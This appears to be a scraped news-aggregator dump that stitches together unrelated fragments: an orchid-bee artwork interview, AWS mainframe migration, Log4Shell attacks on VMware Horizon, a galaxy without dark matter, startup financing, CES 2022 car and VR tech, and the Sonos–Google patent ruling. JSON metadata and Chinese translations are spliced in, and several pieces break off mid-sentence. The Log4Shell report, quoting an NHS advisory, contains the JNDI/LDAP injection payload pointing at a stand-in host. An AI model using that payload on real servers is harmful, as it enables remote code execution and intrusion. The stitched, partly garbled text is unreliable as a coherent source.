community inside those pouches, but it could be that maybe there\u2019s more to what they\u2019re collecting than just thinking of them, oh, how cute, these bees collect and make their own perfumes. Maybe it serves another kind of purpose that we don\u2019t understand yet.\n Speaking of which, I\u2019m aware that Orchid bees do a particular performance to push the scent into the air, into the perceivability of the female. Can you tell us about that?\n I\u2019ve seen videos of this behavior and I think they all vary a little bit, so it\u2019s not like they all do the same dance, but they all do a kind of dance with their wings and their legs that creates like a pumping motion that sprays the scent they\u2019ve collected in their hind leg pouches into the air in front of the female during mating season.\n The fact that Orchid bee courtship behavior involves creating and sharing a cologne is an interesting phenomenon.\n Science understands it as a means to serve the purpose of getting the scent out in a mist form, but I like to think about it as a ritualistic dance or ceremonial dance, it gives it another dimension to be understood by. Maybe this is a spiritual experience for them. Maybe it is just pleasure. We tend to write about it as this tool they use for mating, like the Bowerbird that collects beautiful objects and makes a house out of it to impress the female. Maybe it\u2019s more than that. Maybe there\u2019s something to it that we don\u2019t get, and that\u2019s ok.\n P retty much all our observations of behaviors, especially in animals and insects, are given Darwinian-based interpretations. What are your hopes for this piece in terms of thinking about the ecological and biodiversity extinction crisis that we\u2019re in? I felt like you were a making a big statement about chemical communication in nature and the key role pollinators play in life cycles of aromatic flowering plants. These are complex relationships. Can you talk a little bit about it?\n I would hope someone would walk away from the piece with a feeling of a lack because that smell is, like I said, it could be one in a million of interpretations that\u2019s made on what a perfume collected by an orchid bee may smell like. And so that itself is already a loss. And then to think about this scent in terms of extinction really puts it in a timeframe where the situation we\u2019re in now might really feel like, as something that\u2019s already bygone. If that makes any sense. I hope someone could encounter this piece and, well, be left with a chance to think about the times we\u2019re in and what could be done to provoke some sort of emotion and then perhaps action.\n That\u2019s part of the reasons why World Sensorium Conservancy is working conserve aromatic plants. To actually preserve the scent, we must preserve the plant. But what we are really talking about is conserving ecological communities. I felt that  Euglossini cologne brings attention to the pollinators and how the symbiotic relationship between pollinators and the plants are intertwined in the survival.\n The work took me to the plants are severe decline and threatened with extinction. The artwork brings attention to the fact that there\u2019s really no way to preserve their smell yet. There is progress in chemical analysis and recreations but these really aren\u2019t accurate- they\u2019re high concept. We must save the plants, and the community of species that create the smells. it means also saving the ecosystems because the bacteria are often the producers of the smells and you have to save the bacteria. We need to be conserving whole ecological communities. These are very powerful and primal relationships that are jeopardy.\n I completely agree. We need to be thinking about the rhizomatic connections in an ecology that interweaves into each other\u2019s survival, instead of viewing each plant as a specimen. I was brought up with a positivist mentality, and even though I\u2019ve come to find much joy in science, I\u2019m also learning that there are no technofixes. It is tempting to buy into the narrative that scientists will engineer bacteria to digest plastic waste or that extinct wooly mammoths can be resurrected in a lab, but as we\u2019ve witnessed with each case, there can be no isolated solution for a global ecological crisis. The scientific community didn\u2019t learn about the underground mycelial wood wide web until 1997 (while sylvan communication has been described in many indigenous epistemologies), and we are slowly coming to terms with the impact that our microbial communities have on us. Our understanding of conservation needs to be as networked, grounded and interconnected as the microbial inter-glot that sustains our environments, inside and out, with or without our (scientific) knowledge.\n HsuRae\u00a0 (Taiwanese) is an artist and educator of Bioart and endosymbiotic aesthetics.

Some might want to refactor their mainframe workloads to run on AWS by transforming legacy applications \u2013  likely written in COBOL \u2013 into modern Java-based cloud services.\n  Alternatively, customers can keep their applications as written and re-platform their workloads to AWS reusing existing code with minimal changes.\n  Mainframe Modernization promises a complete, end-to-end migration pipeline that includes development, testing, and deployment tools necessary to automate the process.\n  \u201cWith today\u2019s launch of AWS Mainframe Modernization, customers and systems integrators can now more quickly modernize their legacy mainframe workloads in a predictable way and get rid of much of the complexity and manual work involved in migrations,\u201d said William Platt, GM of Migration Services at AWS.\n  The service puts the cloud vendor at odds with mainframe manufacturers and specialist software vendors that include IBM, Unisys, Bull, NEC, and Fujitsu.\n  Mainframe Modernization was presented at this week\u2019s re:Invent conference in Las Vegas, where AWS also announced the expansion of the Outpost hardware line-up, a private 5G networking service, and new EC2 instances.\n    More than 50 years after the appearance of the first mainframe, the IBM System/360, these hulking machines are still a common sight in banking, insurance, and retail, thanks to their ability to efficiently process huge volumes of transactions, and their reputation for security and uptime.\n  However, these systems are incredibly expensive and difficult to maintain, and the pool of people qualified to deal with their legacy software is shrinking all the time.\n  AWS has been trying to get customers off mainframes and into its data centers  for years. This time, the company says it has built a runtime enthronement provides all the necessary compute, memory, and storage to run both refactored and replatformed applications while automatically handling capacity provisioning, security, load balancing, scaling, and application health monitoring.\n  Since this is all done via public cloud, there are no upfront costs, and customers only pay for the amount of compute provisioned.\n  Brazil\u2019s Banco Inter was among the first organizations to sign up for Mainframe Modernization with AWS.\n  \u201cBy using the AWS Mainframe Modernization managed runtime, we expect to simplify our card processor operations for enhanced resiliency and scalability,\u201d said Guilherme Ximenes, CTO at Banco Inter. \u201cWe are also excited by the DevOps CI/CD pipeline for increasing the agility we need to more quickly deliver new credit and debit card transaction capabilities to our customers.\u201d\n  AWS Mainframe Modernization is available in preview in US East (N. Virginia), US West (Oregon), Asia Pacific (Sydney), EU (Frankfurt), and South America (S\u00e3o Paulo) regions, before being expanded to additional locations \u201cin the coming months.\u201d\n  The AWS approach to refactoring legacy software is not unique: a similar model has been promoted by other companies, like the Swiss startup LzLabs, which has been developing a product called Software-Defined Mainframe since 2011, based on its own COBOL and Java interoperability architecture.\n  Going in a different direction, the Open Mainframe Project  founded in 2015 is attempting to make existing machines a lot more useful, by teaching them to run on Linux, rather than proprietary operating systems like z/OS.\n  It would be useful to note that the death of the mainframe has been predicted for  at least two decades, and yet these machines have managed to stay surprisingly relevant.\n  Do you have strong opinions about mainframes?

It resides in Log4J, a system-logging code library used in thousands if not millions of third-party applications and websites. That means there is a huge base of vulnerable systems. Additionally, the vulnerability is extremely easy to exploit and allows attackers to install Web shells, which provide a command window for executing highly privileged commands on hacked servers.\n  The remote-code execution flaw in Log4J  came to light in December after exploit code was released before a patch was available. Malicious hackers quickly began  actively exploiting CVE-2021-44228 to  compromise sensitive systems.  \u201cAn unknown threat group has been observed targeting VMware Horizon servers running versions affected by  Log4Shell vulnerabilities in order to establish persistence within affected networks,\u201d officials with the UK\u2019s National Health System  wrote. They went on to provide guidance on specific steps affected organizations can take to mitigate the threat.\n Chief among them is the recommendation to install an update that\u00a0 VMware released for its Horizon product, which gives organizations a means to virtualize desktop and app capabilities using the company\u2019s virtualization technology. NHS officials also noted signs that vulnerable organizations can look for to identify any possible attacks they may have sustained.\n  The advisory comes a day after the Federal Trade Commission\u00a0 warned consumer-facing businesses to patch vulnerable systems to avoid the fate of Equifax. In 2019, the credit-reporting agency agreed to  pay $575 million to settle FTC charges resulting from its failure to patch a similarly severe vulnerability in a different piece of software known as Apache Struts. When an unknown attacker exploited the vulnerability in Equifax\u2019s network, it led to the  compromise of sensitive data for 143 million people, making it among one of the  worst data breaches ever. \u201cThe FTC intends to use its full legal authority to pursue companies that fail to take\u202freasonable\u202fsteps to protect consumer data from exposure\u202fas a result of Log4j or similar known vulnerabilities in the future,\u201d FTC officials  said\n    The NHS is at least the second organization to observe exploits targeting a VMware product. Last month, researchers  reported that attackers were targeting systems running VMware VCenter with the aim of installing the Conti ransomware.\n The attacks targeting unpatched VMware Horizon servers take aim at its use of an open source service.\n \u201cThe attack is very likely initiated via a Log4Shell payload similar to ${jndi:ldap://example.com},\u201d the NHS advisory stated. \u201cThe attack exploits the Log4Shell vulnerability in the Apache Tomcat service which is embedded within VMware Horizon. This then launches the following PowerShell command, spawned from ws_TomcatService.exe:\u201d\n  Following a few additional steps, the attackers are able to install a Web shell that has persistent communication with a server they control.

But unlike almost every other galaxy ever seen\u2014including our own Milky Way\u2014they didn\u2019t seem to be enshrouded in huge masses of dark matter, which would normally hold those stellar metropolises together with their gravity. The scientists picked one to zoom in on, a modest-sized galaxy about 250,000 light-years away, and they pointed the 27 radio telescope antennas of the Very Large Array in New Mexico at it.\n After gathering 40 hours\u2019 worth of data, they mapped out the stars and gas and confirmed what the earlier snapshots had hinted at: \u201cThe dark matter content that we infer in this galaxy is much, much smaller than what you would expect,\u201d says Fraternali, an astronomer at Kapteyn Astronomical Institute of the University of Groningen in the Netherlands. If the team or their competitors find other such galaxies, it could pose a challenge for scientists\u2019  view of  dark  matter, the dominant perspective in the field for at least 20 years. Fraternali and his team  published their findings in December in the  Monthly Notices of the Royal Astronomical Society.\n Based on decades of telescope observations and computer simulations, scientists have come to think of dark matter as the hidden skeleton of the cosmos; its \u201cjoints\u201d are massive clumps of invisible particles which host galaxies large and small. But Fraternali isn\u2019t the first to glimpse an exception to that rule. A few years ago, Pieter van Dokkum, an astronomer at Yale, and his colleagues  discovered similar galaxies with the  Hubble telescope that also seemed to lack dark matter. \u201cThese galaxies that we found in 2018, they created a lot of controversy and discussion and follow-up work because they were unexpected and difficult to explain,\u201d van Dokkum says.\n    Those other galaxies lived in a crowded environment, where bigger, neighboring galaxies frequently fly by, possibly pulling away dark matter with them. In contrast, Fraternali\u2019s galaxy is pretty isolated, with no such bothersome neighbors, so its dearth of dark matter can\u2019t be explained that way. \u201cIt could be very significant,\u201d van Dokkum says. \u201cHow do you get stars and gas in that location together without the help of dark matter?\u201d\n These strange objects have come to be called \u201cultra-diffuse galaxies.\u201d They\u2019re extreme outliers: In terms of their mass, they\u2019re minuscule, but they\u2019re spread out over vast distances. Some are as large as the Milky Way, but with only a hundredth as many stars\u2014or even fewer. They\u2019re so close to being transparent that they\u2019re tough to spy in the night sky. \u201cThey\u2019re slightly fainter in the center, so they\u2019re difficult to detect. Now, with better telescopes and deeper observations, they have become more well known,\u201d says Mireia Montes, an astronomer at the Space Telescope Science Institute in Baltimore and an expert on such galaxies.\n Starting in the 1960s, American astronomer Vera Rubin and others first revealed the likely existence of unseen, or \u201cdark,\u201d matter while measuring how fast stars in galaxies whirl around the center, showing that inner stars orbit at different speeds than outer ones. Based on those stars\u2019 rotation, scientists calculated how much mass the galaxy must have to keep them constantly orbiting, rather than being flung into space. For many galaxies, that mass was many times larger than that of all the stars added up. Scientists resolved the problem by inferring the presence of some kind of dark matter, which doesn\u2019t emit or reflect light, and which must be making up the rest of the mass that\u2019s holding the galaxy together.", "posttime": "2022-01-10 00:22:43", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u6697\u7269\u8d28,discover,\u661f\u7cfb", "title": "\u5929\u6587\u5b66\u5bb6\u53d1\u73b0\u4e00\u4e2a\u6ca1\u6709\u6697\u7269\u8d28\u7684\u5947\u602a\u7684\u661f\u7cfb", "title_en": "Astronomers discover a strange galaxy without dark matter", "transed": 1, "url": "https://arstechnica.com/science/2022/01/astronomers-discover-a-strange-galaxy-without-dark-matter/", "via": "", "real_tags": ["\u6697\u7269\u8d28", "discover", "\u661f\u7cfb"]}, {"category": "", "categoryclass": "", "imagename": "6e6da9d28a385fb2f3a94fa10fb4c084.jpg", "infoid": 1072523, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Miguel Fernandez\u662fCapchase\u7684\u9996\u5e2d\u6267\u884c\u5b98\u548c\u8054\u5408\u521b\u59cb\u4eba\u3002\u4ed6\u5bf9\u6539\u53d8\u8425\u8fd0\u8d44\u91d1\u52a8\u6001\u7684\u70ed\u60c5\uff0c\u4f7f\u5176\u6210\u4e3a\u6280\u672f\u516c\u53f8\u7684\u4e3b\u8981\u73b0\u91d1\u6765\u6e90\u3002\n\u6536\u5165\u878d\u8d44\u4f7f\u516c\u53f8\u80fd\u591f\u5728\u5065\u5eb7\u7684\u6210\u957f\u8f68\u9053\u4e0a\u7acb\u5373\u4ece\u5ba2\u6237\u7684\u6708\u5ea6\u4ed8\u6b3e\u4e2d\u7acb\u5373\u83b7\u53d6\u672a\u6765\u7684\u73b0\u91d1\u6d41\u91cf\u3002\u53e6\u4e00\u4e2a\u597d\u5904\u662f\u501f\u6b3e\u4eba\u7684\u4fe1\u7528\u9650\u989d\u53ef\u4ee5\u6839\u636e\u5176\u6bcf\u6708\u9884\u671f\u589e\u957f\u8c03\u6574\uff0c\u4ed6\u4eec\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u7ed8\u5236\u8d44\u91d1\u3002", "note_en": "Miguel Fernandez is CEO and co-founder of  Capchase. He is passionate about changing working capital dynamics to make it the main source of cash for tech companies.\n  Choosing the right financing partner can be tedious, as they need to align with your mission, values and objectives. Otherwise, you get stuck in a relationship that doesn\u2019t align with your goals and may lead you ending up with lower ownership than expected.\n Here\u2019s a rundown of how alternative financing came to be, how it can benefit high-growth SaaS startups and how to know if it\u2019s right for you.\n  There is a dearth of non-dilutive financing options for growth-stage, recurring-revenue businesses. We\u2019ve found that traditional sources of debt capital (such as banks) simply prefer to provide debt to asset-heavy businesses where collateral can be secured.\n  When it comes to SaaS or asset-light business models, there simply isn\u2019t an asset base to collateralize, which makes traditional debt providers uncomfortable. Moreover, while subscription or recurring revenue business models aren\u2019t technically new, they have been undersupported. SaaS companies can often only look to traditional banks for financing after achieving profitability and/or receiving institutional venture capital backing.\n This rules-based approach is pragmatic, but results in a massive gap in the market for early-stage companies that have achieved product-market fit and serious revenue traction.

It\u2019s a device, connecting you with the other devices that run your life. It\u2019s an assistant, anticipating your needs by creepily watching you and collecting data on your every movement.\n The big themes this year focused on services and experiences that drivers and passengers can have inside vehicles, the advanced driver-assistance systems (ADAS) and automated driving features that handle some of the drudgery of driving so you can have those experiences, and the compute power needed to deliver it all.\n  Of course, there was other vehicle tech that popped up: Who can forget BMW\u2019s color-changing car? NFTs even made an appearance. Here\u2019s the in-vehicle tech that stood out to us.\n  We heard a lot about digital cockpits that transform the front cab into a world of digital content, entertainment and services. Many companies threw around the term \u201cco-pilot\u201d and depending on how that company defined it, the co-pilot could include voice assistants or even actual driver-assistance systems that can control certain functions of the vehicles. And there were deep insinuations that one should never, if one can help it, stop watching TV or streaming video \u2014 especially not when in a moving vehicle.\n All of that requires processing power and at 2022 CES the automotive chip game was on.\n    Qualcomm doubled down on its commitment to powering  automotive in-vehicle tech at CES 2022 by bringing on new OEM clients. The tech giant\u2019s Snapdragon Digital Chassis offers automakers a platter of cloud-connected \u201cplatforms\u201d consisting of systems on a chip (SoC) and software that can be adopted in full or \u00e0 la carte.\n The chassis includes: the Snapdragon Ride Platform for ADAS and automated driving, the Auto Connectivity Platform for LTE, 5G connected services, cellular vehicle-to-everything (C-V2X), Wi-Fi, Bluetooth and precise positioning, and the next generation of the Snapdragon Cockpit, a digital cockpit and infotainment system.\n Volvo and Honda announced plans to integrate the digital cockpit into upcoming electric vehicles, and Renault, which has already committed to bringing the cockpit into future cars, expanded the partnership to include everything the chassis has to offer. General Motors will also be relying on Snapdragon to  power its next-gen ADAS.\n  While Volvo\u2019s infotainment is being powered by Qualcomm\u2019s SoC, its new automated driving (AD) features will be powered by Nvidia\u2019s.  Autonomous trucking startup TuSimple also said at CES 2022 that it would use Drive Orin to power and scale its self-driving tech.\n Nvidia\u2019s chip is a central computer for intelligent vehicles that\u2019s made specifically for autonomous applications. It delivers 254 trillion operations per seconds and provides the sort of auto-grade compute power needed to handle self-driving functions.\n JiDU Auto, Baidu\u2019s electric vehicle company, also announced it will use the Nvidia Drive Orin SoC. This next-generation vehicle with Level 4 autonomous driving capability will make its debut at the Beijing Auto Show in April, followed by mass production and delivery by 2023.\n Other companies using Drive Orin include\u00a0Polestar, IM Motors, Li Auto, NIO, R Auto and Xpeng.\n  Intel subsidiary Mobileye announced plans to bring a  new supercomputer to market designed to give passenger cars, trucks and SUVs autonomous driving powers.\n The company introduced at the 2022 CES tech trade show a new system on chip called EyeQ Ultra that is purpose-built for autonomous driving. The company said the first silicon for the EyeQ Ultra SoC, which is capable of 176 trillion operations per second (TOPS), is expected at the end of 2023 with full automotive grade production in 2025.\n The company also introduced at CES its next-generation EyeQ SoC for advanced driver-assistance systems called EyeQ6L and EyeQ6H.\n  What do you get when you combine the internet with insane processing power in a vehicle? A sci-fi world of incredible, and some might say unnecessary, tech that lets car owners sync their digital and physical worlds.\n Want to program your car to order you a pizza as you leave the office so it\u2019s hot and ready when you get home? It can be done. Feel like hearing the stats on your battery\u2019s power and vehicle range? Speak and it shall be delivered. Want to put your feet up and watch the latest episode of \u201cThe Wheel of Time\u201d? There\u2019s tech for that, too.\n The in-vehicle tech displayed at CES drilled home the idea of the car as a connected device that is meant to make your life easier, smoother and more entertaining.\n   Many cars today run their infotainment systems off of Android\u2019s auto operating system, making it easier to access your phone and compatible apps on your phone from your car. This year, Google took it a few steps further.\n Volvo and Google announced an integration with the Google Home ecosystem, which would allow Volvo car owners to issue voice commands to Google Assistant-enabled devices. They can tell the assistant to do things like turn the car on and off, heat it up or cool it down and provide car info like battery life. Volvo also shared plans to enable YouTube app downloads, thanks to both Google integrations with Volvo vehicles and Qualcomm\u2019s Snapdragon cockpit.\n Google also added features to its digital car key with BMW, which enables users to lock, unlock and start certain BMW cars with select Google Pixel and Samsung Galaxy phones. Now, the car will automatically unlock itself when the device gets close enough, and users can share their digital car key with friends or family.\n   In previous years at CES, Amazon showed up in a number of vehicles via its virtual assistant Alexa. This year, the power of Alexa is combining with  Amazon\u2019s Fire TV streaming platform, which is working its way into more cars.\n Last year, global automaker Stellantis integrated the Fire TV into its vehicles, and at CES 2022, we\u2019re seeing the in-car entertainment systems of certain Jeep, Chrysler,  BMW and Ford vehicles get an upgrade, as well.\n Fire TV for cars will do more than offer a TV streaming platform. It\u2019ll sync with Alexa so drivers and passengers can simply speak a command and  poof!, \u201cOlaf Presents\u201d is playing in the backseat and your children are blessedly quiet. Users can also ask Alexa to show their Ring doorbell video on the Fire TV using voice commands.\n Stellantis is getting even cozier with Amazon. At CES 2022, Stellantis  announced a wide-ranging collaboration that will touch nearly every aspect of its business. Amazon\u2019s technology will be used to help Stellantis develop vehicles, build connected in-vehicle experiences and train the next generation of automotive software engineers.\n As part of this multiyear deal, Stellantis has selected Amazon Web Services (AWS) as its preferred cloud provider for vehicle platforms. Stellantis, which recently launched a software academy for existing and new employees, is also working with AWS to create a curriculum that will cover software, data and cloud technology.\n  Software company Cerence unveiled its Cerence Co-Pilot, an in-car assistant that uses continuous learning to anticipate the needs of drivers and proactively initiate actions. The co-pilot is integrated with the car\u2019s sensors and data to understand the environment inside the vehicle and around it, analyzing things like voice, gaze, gesture and touch to understand user preferences and perform actions on the driver\u2019s behalf.\n Cerence\u2019s co-pilot can do things like control smart home and IoT devices, authorize payments for in-car purchases and remind drivers about car maintenance needs, even scheduling a trip to the shop for them.\n While the company didn\u2019t share which automakers are signed onto integrate the co-pilot, a video demonstrating the tech showed such brands as Volvo, BMW, Audi and Mercedes, some of which have worked with Cerence in the past.\n  Blackberry announced a partnership with Pateo, an internet-of-vehicles service and product provider in China, that will see Blackberry Ivy, the company\u2019s intelligent vehicle data platform co-developed with Amazon Web Services, integrated into Pateo\u2019s digital cockpit solution. The two companies are to work with an unnamed Chinese automaker to pilot the cockpit on its electric model lineup.\n The software company most renowned for its mobile phones didn\u2019t share much about what that cockpit would look like, but it should encompass such features as intelligent voice, entertainment, vehicle health monitoring, secure payment and cloud technology. Blackberry and Pateo will also incorporate Electra Vehicles\u2019s EVE-Ai 360 Adaptive Controls that provides prediction of battery state of charge, state of health and project vehicle range.\n  In past years, autonomous driving took center stage. This year, the focus was more on advanced driver-assistance systems and promises to bring restricted automated driving features to passenger vehicles. Due to the advancements in vehicle sensors, compute power and software, automakers are working to automate certain aspects of the car, like parking or highway driving.\n That doesn\u2019t mean some companies pursuing so-called Level 4 autonomous driving didn\u2019t show up at CES; they just weren\u2019t the ones yelling the loudest this year.\n  As we mentioned earlier, GM\u2019s new Ultra Cruise hands-free ADAS system will be powered by Qualcomm\u2019s Snapdragon SoC. GM introduced the Ultra Cruise system in 2021, but this was the first time we heard more details about the compute and some of the capabilities.\n The system is an upgrade from the automaker\u2019s Super Cruise ADAS first introduced in 2017, and it\u2019s expected to be able to handle 95% of all driving scenarios.\n Ultra Cruise, which is coming to the new electric Cadillac Celestiq in 2023, will rely on sensors like cameras, radar and lidar (not just lidar map data) to feed data to GM\u2019s software that will then output decisions.\n   Volvo shared plans to work with  lidar company Luminar and AD software company Zenseact to introduce Ride Pilot as an add-on subscription to an electric SUV that will be revealed later this year. Ride Pilot is an \u201cunsupervised\u201d AD feature, meaning it can drive itself fully while drivers are on certain highways, giving them the ability to go completely hands and eyes free so they can enjoy other activities, like the YouTube watching we mentioned earlier.\n  Chinese internet giant Baidu\u2019s EV startup JiDU came to CES 2022 with news that it would power its first production EV model, which is expected to begin deliveries in 2023, on Nvidia\u2019s Drive Orin SoC (as mentioned above). The company said it would have Level 4 autonomous driving capabilities, all of which would be revealed in April at the Beijing Auto Show.\n JiDu is just a year old and recently demonstrated intelligent assisted driving in both urban and high-speed areas in its SIMUCar.\n   While not entirely focused on autonomous driving capabilities or ADAS features, it\u2019s worth noting how  Cadillac envisions the inside of its future autonomous vehicles. Its InnerSpace concept shows your standard spaceship-looking two-seater car from the outside, while inside it still looks like a spaceship. But like a sexy spaceship.\n Rather than separate driver and passenger seats, there\u2019s a plush and sleek loveseat that appears to constantly be in recline mode, which checks out given the built-in ottoman and compartment for slippers and a blanket. A mere couple of feet in front of the passengers\u2019 heads is a wide, curved screen. No steering wheels or pedals are featured.\n   Last October, teams from around the world converged on the Indianapolis Motor Speedway to demonstrate autonomous racing.\n The teams gathered again, this time at the Las Vegas Motor Speedway on January 7 with the Autonomous Challenge @ CES. IAC university teams developed the software that runs the autonomous racecar, the Dallara AV-21.\n Leading up to the event, the organization published a few videos, including this  one that was filmed at night.\n  Gentex, which supplies automotive and aerospace sectors, showed off the results of two acquisitions in 2021: Israel-based Guardian Optical Technologies and Vaposens.\n The company showed a lot, but its ultra-sensitive driver monitoring system that is designed to be used to support driver-assistance systems got our attention. Guardian Optical Technologies developed an infrared-sensitive, high-resolution camera combining machine vision, depth perception and micro-vibration detection. What this means is its proprietary sensor configuration can monitor the entire vehicle cabin and all its objects and occupants, assessing their behavior, gestures and activities.\n    In addition to revealing three new EVs at CES this year, Vietnamese EV company Vinfast announced the formation of its early-bird reservation site. The first to preorder will receive a \u201cVinFirst\u201d certificate on the blockchain platform in NFT form, which the company says is a completely transparent way to prove ownership of an order number.\n The term \u201cdigital twin\u201d popped up a few times in the automotive sector at CES 2022, including an announcement from Cerence and Vinfast. The gist is this: Cerence has cloud-based software that allows Vinfast (or any other company intrigued by the product) to create a virtual representation of its entire car, including software, mechanics, electrics and physical behavior, along with driver data and environmental data.\n  Indi EV, a California-based EV startup, came out with a prototype of its Indi One at CES, which the company says is \u201cthe world\u2019s first social media-oriented car.\u201d What that seems to mean is a car that has an integrated computer for gaming, a complete Windows workstation that can handle Zoom calls and even record events that can later be shared on social media and software that lets riders capture trip content and video to be uploaded to the cloud.\n If all that wasn\u2019t enough, the Indi One is meant to enable a type of mobile blockchain, wherein each vehicle can act as a node for a blockchain. Exactly why that\u2019s significant is unclear, but You Do You, Indi EV. Customers can start preordering by the end of Q1, and the car is expected to go for around $45,000.\n  BMW  unwrapped its color-changing car at CES, the BMW iX Flow. Right now, the e-paper wrapping the vehicle can only change between black and white, but more colors are expected in the future that will enable users to give their car a more personalized look to match their mood.\n  NextbaseDash cam tech company Nextbase unveiled its smart and connected dash cam, the Nextbase iQ. It gives drivers a lot of the same safety and security features they would get in their home-monitoring systems, like real-time alerts and access to incident video even while they\u2019re away from their car. Users can also get real-time access to the dash cam from anywhere at anytime through the iQ app.\n  Finally, Mercedes revealed the  Vision EQXX, a concept vehicle that is meant to showcase what the automaker\u2019s electric future will look like. This eye-popping sport EV wasn\u2019t just about aerodynamics and a sleek design. The company squeezed in power, efficiency and range into the compact and sporty package.\n  Some of the neat tech in the EQXX worth noting is the\u00a0one-piece 47.5-inch LED display with 8K resolution. The infotainment screen has responsive real-time graphics that will span the width of the vehicle, according to Mercedes.\n The automaker worked with NAVIS Automotive Systems to develop a 3D navigation system that users can zoom into and scroll around for this massive screen. And like the company\u2019s newer models, the EQXX also featured an advanced voice assistant and software that learns your behavior over time.\n  In the lidar world, Luminar\u2019s eyebrow-raising stunt comparing Tesla\u2019s ADAS system to its own (to the peril of several child-size dummies) was affecting, and its inclusion in Volvo vehicles and Mobileye systems is a coup. But it\u2019s still an expensive and complex system, a major investment with uncertain (if potentially significant) benefits.\n Here\u2019s me driving the Tesla Model Y on the left.

While Google is facing an import ban, a spokesperson said that the tech giant doesn\u2019t expect the ruling to interrupt its ability to import and sell devices.\n \u201cWhile we disagree with today\u2019s decision, we appreciate that the International Trade Commission has approved our modified designs,\u201d the spokesperson told   Protocol. \u201cWe will seek further review and continue to defend ourselves against Sonos\u2019 frivolous claims about our partnership and intellectual property.\u201d The commission didn\u2019t challenge those alternative designs in its final decision, which means Google can implement them.\n  In fact, the Nest team has recently  announced some changes to speaker groups, which it says is \u201cdue to a recent legal ruling.\u201d The most notable change is that, going forward, users will no longer be able to adjust the volume of all speakers in a group all at once. They\u2019d have to adjust each speaker individually instead.\n In a statement, Sonos Chief Legal Officer Eddie Lazarus admitted that there\u2019s a possibility that \u201cGoogle will be able to degrade or eliminate product features in a way that circumvents the importation ban that the ITC has imposed.\u201d However, he said the tech giant\u2019s products will still \u201cinfringe many dozens of Sonos patents\u201d \u2014 that is, unless Google pays Sonos royalties for its technologies.\n  \u201cWe appreciate that the ITC has definitively validated the five Sonos patents at issue in this case and ruled unequivocally that Google infringes all five.

These Sonos patents cover Sonos\u2019 groundbreaking invention of extremely popular home audio features, including the set up for controlling home audio systems, the synchronization of multiple speakers, the independent volume control of different speakers, and the stereo pairing of speakers.\n  There is a possibility that Google will be able to degrade or eliminate product features in a way that circumvents the importation ban that the ITC has imposed. But while Google may sacrifice consumer experience in an attempt to circumvent this importation ban, its products will still infringe many dozens of Sonos patents, its wrongdoing will persist, and the damages owed Sonos will continue to accrue.

The book and movie  \u201cMoneyball\u201d\u00a0showed how Oakland Athletics\u2019 GM Billy Beane changed the sport by introducing advanced statistical analysis instead of simply relying on reports from human scouts. Today, baseball is ruled by analysts as much as experienced baseball professionals \u2014 but could there be too much data?\n Alex Spier writing in the Boston Globe\u2019s  Sunday Baseball Notes column recently pointed out that Boston Red Sox Manager Alex Cora will have 11 coaches on staff this year for 26 players. Compare that with Terry Francona in 2011, who had six for 25, and you can see the number has nearly doubled.\n Spier attributes this in part to the growing amount of data that teams are collecting, which requires more people to observe, interpret, and implement a plan to leverage. As Spier wrote, \u201cThe result? Several teams now feature three hitting coaches, and staffs keep growing in an effort to distill the mountains of information into a digestible form for the 26 players on a roster.\u201d\n  Baseball is like a laboratory for advanced statistical analysis, and businesses could learn a lot from watching how the sport deals with expanding datasets.\n Companies shovel data into data lakes, tinker with machine learning models, and use this information to make decisions, but they still face fundamental decisions every day that involve their ever-growing mountain of information.

If we\u2019re all destined to end up with headsets (be they VR, AR or some mix of the two) strapped to our faces, it\u2019ll be less about one-big-thing* and more the result of a thousand tiny steps. A Beat Saber here; a Supernatural there. Incrementally better/lighter/faster headsets. Maybe folks get used to using headsets for training purposes at work. Maybe everyone suddenly agrees on  what a metaverse is.\n This bit-by-bit advancement held true this year at  CES.

That\u2019s been the rumor \u00a0for a while now.)\n    We\u2019ve known for a while now that Sony has been working on a next-gen headset for the PlayStation 5, following up on the PS VR headset it released in 2016.

Such as:\n It\u2019ll have a wider field of view than the first-gen headset, at 110 degrees versus 96.\n  It\u2019ll be able to track the motion of your eyes, potentially allowing you to do stuff like highlight interface elements just by looking at them.\n It\u2019ll support foveated rendering, which is a fancy way of saying it can use processing power more efficiently by prioritizing the rendering of whatever\u2019s in the center of your vision.\n They\u2019re building new controllers for it (pictured below) with finger detection and the PS5\u2019s mind-bending adaptive triggers.\n  What\u2019ll the headset look like? Unknown! When will it actually ship? TBD! But with the PS VR being one of the few headsets to even kind of rival the  Oculus Meta Quest in terms of ease of use, it\u2019s nice to see Sony continuing to build here.\n   What\u2019s the best way to handle input in VR? Most of the popular headsets have settled on some sort of controller in each hand. What if you just make your  hand the controller, instead?\n Hand tracking isn\u2019t a brand new idea, of course. Companies  have come and gone with hand tracking as their primary focus.\n But HTC\u2019s approach here is a bit different. Instead of relying entirely on cameras, they\u2019re hoping you\u2019ll strap sensor-packed bands to each wrist to help the system track what the cameras can\u2019t see \u2014 like when one hand is obscuring the other, or you\u2019ve got your arm back behind you for a golf swing. The company also demonstrated the sensors working while attached to other objects, like ping pong paddles and a NERF gun.\n The company says the sensors should start shipping later this year for $129. One catch? For now, at least, it\u2019ll only work with HTC\u2019s Vive Focus 3 headset.\n   VR headsets have gotten a whole lot sleeker over the years, but they\u2019re still pretty beefy. How much smaller can they really get, though?\n Panasonic subsidiary Shiftall has been working on an \u201cultra-lightweight, ultra-high-resolution\u201d headset called the Meganex. With speakers built into the frames and a 1.3\u2033 (2560\u00d72560) display for each eye, they end up looking more like a massive pair of steampunk sunglasses than a headset. While designed to be lightweight and foldable, don\u2019t expect to move around  too much in these ones \u2014 you\u2019ll need to attach them to computer via USB-C to do the heavy graphical lifting.\n    Microsoft already uses Qualcomm chips for their HoloLens headsets, but the companies made things a bit more official this week. At Qualcomm\u2019s keynote it was announced that the two will work together to develop chips built specifically for use in AR headsets, with said chips supporting each of their augmented reality development platforms (Microsoft Mesh and Snapdragon Spaces.)\n   It\u2019s not flashy hardware, but it\u2019s potentially important on the software side of things: Nvidia this week opened up Omniverse, its collection of tools for helping 3D content creators work together in real time.\n  Omniverse is Nvidia\u2019s platform for allowing creators, designers and engineers to collaboratively build virtual worlds. It\u2019s the company\u2019s platform that brings together design tools and assets from first- and third-party applications into a single hardware and software ecosystem. Until now, Omniverse and the various Nvidia tools that support it were in beta, but at CES today, the company took off the beta label and made Omniverse generally available to creators.\n   This one seems mostly like a concept for now, so \u2026 well, don\u2019t fall in love just yet. But TV/phone/air conditioner 